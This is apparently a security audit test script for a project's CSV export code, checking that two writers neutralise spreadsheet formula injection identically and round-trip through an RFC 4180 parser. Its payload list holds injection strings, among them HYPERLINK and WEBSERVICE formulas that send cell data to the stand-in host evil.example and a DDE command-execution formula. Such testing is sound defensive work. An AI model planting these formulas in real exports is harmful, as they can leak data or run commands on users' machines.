/**
 * t8-csv.ts — E-7. Formula injection in BOTH writers, byte-identical parity,
 * and a round trip through an RFC 4180 parser written here from the spec.
 *
 * The two writers are `csvCell`/`csvLine`/`csvHeader` in server/csv.ts and
 * `rowsToCsv` in src/lib/channel.ts. They are separate copies, so this imports
 * BOTH and compares the bytes.
 *
 * run: node_modules/.bin/tsx audit/run-2/area-E/t8-csv.ts
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  COMMENT_COLUMNS as S_COMMENT,
  TRANSCRIPT_COLUMNS as S_TRANSCRIPT,
  VIDEO_COLUMNS as S_VIDEO,
  SUMMARY_COLUMNS as S_SUMMARY,
  STATUS_COLUMNS as S_STATUS,
  csvHeader,
  csvLine,
  neutraliseFormula,
  writeCsv,
  writeCsvFromJsonl,
} from "../../../server/csv";
import {
  COMMENT_COLUMNS as C_COMMENT,
  TRANSCRIPT_COLUMNS as C_TRANSCRIPT,
  VIDEO_COLUMNS as C_VIDEO,
  SUMMARY_COLUMNS as C_SUMMARY,
  STATUS_COLUMNS as C_STATUS,
  rowsToCsv,
} from "../../../src/lib/channel";

// --- an independent RFC 4180 parser, written from the spec ----------------
function parseCsv(text: string): string[][] {
  let s = text;
  if (s.charCodeAt(0) === 0xfeff) s = s.slice(1);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let i = 0;
  let quoted = false;
  while (i < s.length) {
    const c = s[i];
    if (quoted) {
      if (c === '"') {
        if (s[i + 1] === '"') {
          field += '"';
          i += 2;
          continue;
        }
        quoted = false;
        i += 1;
        continue;
      }
      field += c;
      i += 1;
      continue;
    }
    if (c === '"' && field === "") {
      quoted = true;
      i += 1;
      continue;
    }
    if (c === ",") {
      row.push(field);
      field = "";
      i += 1;
      continue;
    }
    if (c === "\r" && s[i + 1] === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      i += 2;
      continue;
    }
    if (c === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
      i += 1;
      continue;
    }
    field += c;
    i += 1;
  }
  if (field !== "" || row.length) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

const FORMULA_FIRST = /^[=+\-@\t\r\n]/;

// --- the payloads a stranger can put in a comment or a caption -----------
const PAYLOADS = [
  "=cmd reply",
  '=HYPERLINK("http://evil.example/?x="&A1,"click")',
  "=WEBSERVICE(\"http://evil.example/\"&A1)",
  "+1+1",
  "-2-2",
  "@SUM(1:1)",
  "=cmd|' /C calc'!A1",
  "\t=1+1",
  "\r=1+1",
  "\n=1+1",
  "=1+1, \"quoted\" caption 🎬 עברית",
  // must NOT be touched: real numbers and plain decimals
  "-5",
  "+5",
  "3.14",
  "-0.5",
  // ordinary text, and the hard RFC 4180 cases
  "plain text",
  'Comma, then "quoted", then a newline\nsecond line 🎬 שלום עולם',
  "",
  "   =leading spaces then equals",
  "a=b",
];

const out: Record<string, unknown> = {};

// --- 1. neutralisation, per payload, in both writers --------------------
const perPayload = PAYLOADS.map((p) => {
  const server = csvLine(["text"], { text: p });
  const client = rowsToCsv(["text"], [{ text: p }]);
  const clientCell = client.split("\r\n")[1] + "\r\n";
  const parsed = parseCsv(server)[0][0];
  return {
    payload: p,
    looksLikeFormula: FORMULA_FIRST.test(p),
    serverCell: server.trimEnd(),
    clientCell: clientCell.trimEnd(),
    identical: server === clientCell,
    neutralised: parsed.startsWith("'"),
    roundTripsToOriginal: parsed === p || parsed === `'${p}`,
    parsedBack: parsed,
  };
});
out.perPayload = perPayload;
out.formulaPayloadsAllNeutralised = perPayload
  .filter((r) => r.looksLikeFormula && !/^[+-]?\d+(\.\d+)?$/.test(r.payload))
  .every((r) => r.neutralised);
out.numbersUntouched = perPayload
  .filter((r) => /^[+-]?\d+(\.\d+)?$/.test(r.payload))
  .map((r) => ({ payload: r.payload, neutralised: r.neutralised }));
out.allIdentical = perPayload.every((r) => r.identical);

// --- 2. typed values: a number must not be quoted-escaped differently ---
const TYPED: Array<Record<string, unknown>> = [
  { text: -5, like_count: -5 },
  { text: 0, like_count: 0 },
  { text: null, like_count: undefined },
  { text: false, like_count: true },
  { text: "=5", like_count: "-5" },
];
out.typedParity = TYPED.map((row) => {
  const server = csvLine(["text", "like_count"], row);
  const client = rowsToCsv(["text", "like_count"], [row]).split("\r\n")[1] + "\r\n";
  return { row: JSON.stringify(row), server: server.trimEnd(), client: client.trimEnd(), identical: server === client };
});
out.typedAllIdentical = (out.typedParity as Array<{ identical: boolean }>).every((r) => r.identical);

// --- 3. column lists and headers byte-identical ------------------------
const COLSETS: Array<[string, string[], string[]]> = [
  ["VIDEO", S_VIDEO, C_VIDEO],
  ["COMMENT", S_COMMENT, C_COMMENT],
  ["TRANSCRIPT", S_TRANSCRIPT, C_TRANSCRIPT],
  ["STATUS", S_STATUS, C_STATUS],
  ["SUMMARY", S_SUMMARY, C_SUMMARY],
];
out.columnParity = COLSETS.map(([name, a, b]) => ({
  name,
  equal: JSON.stringify(a) === JSON.stringify(b),
  headerIdentical: csvHeader(a) === rowsToCsv(b, []).split("\r\n")[0] + "\r\n",
  serverHeader: csvHeader(a).replace(/^﻿/, "").trimEnd().slice(0, 90),
}));

// --- 4. a whole file, both writers, byte-for-byte ----------------------
const COMMENT_ROWS = PAYLOADS.map((text, i) => ({
  video_id: `vid${i}`,
  comment_id: `c${i}`,
  parent_id: "",
  is_reply: false,
  author: 'A, "B" 😀',
  author_channel_id: "UC1",
  text,
  like_count: i % 3 === 0 ? -i : "",
  is_pinned: false,
  is_uploader: false,
  published_time: "1 day ago",
  timestamp: 0,
}));
const serverWhole = csvHeader(S_COMMENT) + COMMENT_ROWS.map((r) => csvLine(S_COMMENT, r)).join("");
const clientWhole = rowsToCsv(C_COMMENT, COMMENT_ROWS);
out.wholeFile = {
  identical: serverWhole === clientWhole,
  serverBytes: Buffer.byteLength(serverWhole),
  clientBytes: Buffer.byteLength(clientWhole),
  firstDifferenceAt: (() => {
    for (let i = 0; i < Math.max(serverWhole.length, clientWhole.length); i++)
      if (serverWhole[i] !== clientWhole[i]) return { i, server: serverWhole.slice(i, i + 40), client: clientWhole.slice(i, i + 40) };
    return null;
  })(),
};

// --- 5. round-trip the whole file through the independent parser -------
function roundTrip(text: string, columns: string[], rows: Record<string, unknown>[]) {
  const parsed = parseCsv(text);
  const bom = text.charCodeAt(0) === 0xfeff;
  const crlf = text.includes("\r\n");
  const header = parsed[0];
  const ragged = parsed.filter((r) => r.length !== columns.length).length;
  const failures: unknown[] = [];
  rows.forEach((row, i) => {
    const got = parsed[i + 1];
    columns.forEach((c, j) => {
      const expectedRaw = row[c] == null ? "" : String(row[c]);
      const expected =
        typeof row[c] !== "number" && FORMULA_FIRST.test(expectedRaw) && !/^[+-]?\d+(?:\.\d+)?$/.test(expectedRaw)
          ? `'${expectedRaw}`
          : expectedRaw;
      if (got?.[j] !== expected) failures.push({ row: i, column: c, expected, got: got?.[j] });
    });
  });
  return { bom, crlf, headerMatches: JSON.stringify(header) === JSON.stringify(columns), ragged, dataRows: parsed.length - 1, failures };
}
out.roundTripServer = roundTrip(serverWhole, S_COMMENT, COMMENT_ROWS);
out.roundTripClient = roundTrip(clientWhole, C_COMMENT, COMMENT_ROWS);

// --- 6. writeCsv / writeCsvFromJsonl on disk, through the same parser --
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "r2e-csv-"));
  writeCsv(path.join(dir, "comments.csv"), S_COMMENT, COMMENT_ROWS);
  fs.writeFileSync(path.join(dir, "comments.jsonl"), COMMENT_ROWS.map((r) => JSON.stringify(r)).join("\n") + "\n");
  const n = writeCsvFromJsonl(path.join(dir, "comments.jsonl"), path.join(dir, "streamed.csv"), S_COMMENT);
  const direct = fs.readFileSync(path.join(dir, "comments.csv"), "utf8");
  const streamed = fs.readFileSync(path.join(dir, "streamed.csv"), "utf8");
  out.onDisk = {
    rowsStreamed: n,
    directEqualsStreamed: direct === streamed,
    directEqualsClient: direct === clientWhole,
    roundTripStreamed: roundTrip(streamed, S_COMMENT, COMMENT_ROWS),
  };
  // keep the bytes as evidence
  fs.mkdirSync(path.join(import.meta.dirname, "out", "csv-evidence"), { recursive: true });
  fs.copyFileSync(path.join(dir, "comments.csv"), path.join(import.meta.dirname, "out", "csv-evidence", "server-writeCsv.csv"));
  fs.copyFileSync(path.join(dir, "streamed.csv"), path.join(import.meta.dirname, "out", "csv-evidence", "server-streamed.csv"));
  fs.writeFileSync(path.join(import.meta.dirname, "out", "csv-evidence", "client-rowsToCsv.csv"), clientWhole);
  fs.rmSync(dir, { recursive: true, force: true });
}

// --- 7. a cell that a spreadsheet reads as a formula AFTER parsing -----
// The only defence is the leading apostrophe, so list every parsed cell whose
// first character is still a formula introducer.
{
  const parsed = parseCsv(serverWhole);
  const bad: unknown[] = [];
  parsed.forEach((r, ri) =>
    r.forEach((cell, ci) => {
      if (FORMULA_FIRST.test(cell) && !/^[+-]?\d+(?:\.\d+)?$/.test(cell))
        bad.push({ row: ri, col: S_COMMENT[ci], firstChar: JSON.stringify(cell[0]), value: cell.slice(0, 50) });
    }),
  );
  out.formulaCellsAfterParse = bad;
  out.neutraliseFormulaSpotChecks = {
    "=x": neutraliseFormula("=x"),
    "-5": neutraliseFormula("-5"),
    "-5a": neutraliseFormula("-5a"),
    "@a": neutraliseFormula("@a"),
    "\\t=1": neutraliseFormula("\t=1"),
    "|cmd": neutraliseFormula("|cmd"),
    "0x1": neutraliseFormula("0x1"),
    "	": neutraliseFormula("\t"),
  };
}

fs.mkdirSync(path.join(import.meta.dirname, "out"), { recursive: true });
fs.writeFileSync(path.join(import.meta.dirname, "out", "t8-csv.json"), JSON.stringify(out, null, 2));

// console summary
console.log("allIdentical (per payload)      :", out.allIdentical);
console.log("typedAllIdentical               :", out.typedAllIdentical);
console.log("wholeFile identical             :", (out.wholeFile as { identical: boolean }).identical);
console.log("column parity                   :", JSON.stringify(out.columnParity));
console.log("formulaPayloadsAllNeutralised   :", out.formulaPayloadsAllNeutralised);
console.log("numbersUntouched                :", JSON.stringify(out.numbersUntouched));
console.log("roundTripServer failures        :", JSON.stringify((out.roundTripServer as { failures: unknown[] }).failures));
console.log("roundTripClient failures        :", JSON.stringify((out.roundTripClient as { failures: unknown[] }).failures));
console.log("onDisk                          :", JSON.stringify(out.onDisk, null, 1));
console.log("formulaCellsAfterParse          :", JSON.stringify(out.formulaCellsAfterParse));
console.log("neutraliseFormula spot checks   :", JSON.stringify(out.neutraliseFormulaSpotChecks));
